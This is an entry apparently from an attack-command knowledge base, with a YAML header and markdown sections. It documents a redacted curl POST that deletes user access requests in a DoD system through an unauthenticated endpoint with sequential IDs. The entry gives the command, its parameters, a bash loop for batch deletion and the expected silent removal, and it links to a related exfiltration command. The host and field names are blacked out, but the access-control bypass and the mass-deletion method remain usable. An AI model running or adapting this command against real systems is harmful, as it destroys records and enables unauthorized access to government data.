---
id: cmd-uuid-delete
data: >-
  curl https://██████/███████████████ -X POST
  -data="url=%2F███████&███████=██████" -k
tags:
  - deletion
  - broken-access-control
type: command
output: 'Successful deletion (200 OK, no body)'
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:28:59.056Z'
verified: false
validated: true
submitted: true
---
# delete-access-request

## Command

```bash
curl https://██████/███████████████ -X POST -data="url=%2F███████&███████=██████" -k
```

## Description

This command demonstrates broken access control by deleting a user access request in the DoD system via an unauthenticated POST to the delete endpoint, using the sequential ID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Encoded path (%2F███████) for the delete action | Yes |
| ███████ | The sequential request ID to delete | Yes |
| -k | Bypass SSL validation | No |

## Examples

### Basic Usage

```bash
curl https://██████/███████████████ -X POST -data="url=%2F███████&███████=12345" -k
```

### Advanced Usage

For batch deletion, script with sequential IDs (e.g., for i in {1..10}; do curl ... &███████=$i; done).

## Expected Output

HTTP 200 OK with minimal or no body; the request is silently removed from the database without confirmation.

## Related

- [[commands/exfiltrate-access-request]]
- [[procedures/Delete-Access-Request-via-Broken-Endpoint]]
